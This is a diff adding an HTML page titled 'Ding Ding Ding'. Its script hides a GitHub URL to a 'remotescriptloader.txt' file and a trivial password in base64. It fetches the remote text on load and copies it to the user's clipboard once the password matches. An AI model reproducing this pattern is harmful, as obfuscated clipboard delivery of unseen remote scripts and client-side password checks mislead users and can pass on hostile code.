@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ding Ding Ding</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            background-color: #f5f5f5;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Ding Ding Ding</h1>
+        <div class="input-group">
+            <label for="secretKey">Enter Ding:</label>
+            <input type="password" id="secretKey" placeholder="Enter your Ding">
+        </div>
+        <button id="submitBtn">Verify & Copy Content</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const secretKeyInput = document.getElementById('secretKey');
+            const submitBtn = document.getElementById('submitBtn');
+            const statusDiv = document.getElementById('status');
+            
+            // Base64 encoded values
+            const encodedKey = 'YXNobGV5'; // 
+            const encodedUrl = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhdmFuYWJhY2t1cC93ZWVkaW5nL3JlZnMvaGVhZHMvbWFpbi9yZW1vdGVzY3JpcHRsb2FkZXIudHh0'; // URL
+            
+            let scriptContent = '';
+
+            // Decode the URL
+            const decodedUrl = atob(encodedUrl);
+
+            // Fetch the remote script when the page loads
+            fetch(decodedUrl)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    scriptContent = data;
+                })
+                .catch(error => {
+                    statusDiv.textContent = 'Error loading content: ' + error.message;
+                    statusDiv.className = 'error';
+                    statusDiv.style.display = 'block';
+                });
+
+            // Event listener for the submit button
+            submitBtn.addEventListener('click', function() {
+                const enteredKey = secretKeyInput.value.trim();
+                const correctKey = atob(encodedKey);
+                
+                if (enteredKey === correctKey) {
+                    // Copy content to clipboard
+                    navigator.clipboard.writeText(scriptContent)
+                        .then(() => {
+                            statusDiv.textContent = 'Authentication successful! Content copied to clipboard.';
+                            statusDiv.className = 'success';
+                            statusDiv.style.display = 'block';
+                        })
+                        .catch(err => {
+                            statusDiv.textContent = 'Failed to copy text: ' + err;
+                            statusDiv.className = 'error';
+                            statusDiv.style.display = 'block';
+                        });
+                } else {
+                    statusDiv.textContent = 'Invalid secret key. Please try again.';
+                    statusDiv.className = 'error';
+                    statusDiv.style.display = 'block';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
